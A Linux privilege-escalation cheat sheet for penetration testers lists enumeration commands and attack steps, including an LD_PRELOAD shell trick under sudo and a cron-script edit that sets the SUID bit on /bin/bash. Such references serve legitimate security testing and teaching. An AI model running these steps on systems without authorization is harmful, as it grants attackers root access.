---
title: "Linux Privilege Escalation"
description: "Common misconfigurations and weaknesses to check when escalating privileges on Linux."
tags: ["linux", "privesc", "post-exploitation"]
publishDate: 2026-05-18
---

<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->

- [Sudo](#sudo)
- [SUID / SGID](#suid--sgid)
- [Misconfiguration](#misconfiguration)
- [Cron Jobs](#cron-jobs)
- [Capabilities](#capabilities)
- [Kernel Exploits](#kernel-exploits)
- [LinPEAS / WinPEAS](#linpeas--winpeas)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

## Sudo

```bash
sudo -l
```

Check [GTFOBins](https://gtfobins.github.io) for any listed binary.

If `env_keep+=LD_PRELOAD` is set:

```bash
# compile a shared lib that spawns a shell
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <allowed_binary>
```

## SUID / SGID

```bash
find / -user root -perm -4000 -ls 2>/dev/null   # SUID
find / -group root -perm -2000 -ls 2>/dev/null  # SGID
```

Check any non-standard binary on GTFOBins.

## Misconfiguration

```bash
# World-writable directories
find / -type d -perm -2 -ls 2>/dev/null

# World-writable files owned by root
find / -user root -perm -2 ! -type l -ls 2>/dev/null
```

## Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
```

If a cron runs a script you can write to, replace its content:

```bash
echo 'chmod +s /bin/bash' >> /path/to/script.sh
```

If the cron uses a relative PATH and a directory is writable, drop a malicious binary earlier in `$PATH`.

## Capabilities

```bash
getcap -r / 2>/dev/null
```

Dangerous capabilities: `cap_setuid`, `cap_net_raw`, `cap_dac_override`.
Check [GTFOBins](https://gtfobins.github.io) for exploitation.

## Kernel Exploits

```bash
uname -r
searchsploit linux kernel $(uname -r)
```

## LinPEAS / WinPEAS

Automated enumeration scripts to surface privesc vectors quickly.

- [LinPEAS (linux)](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [WinPEAS (windows)](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
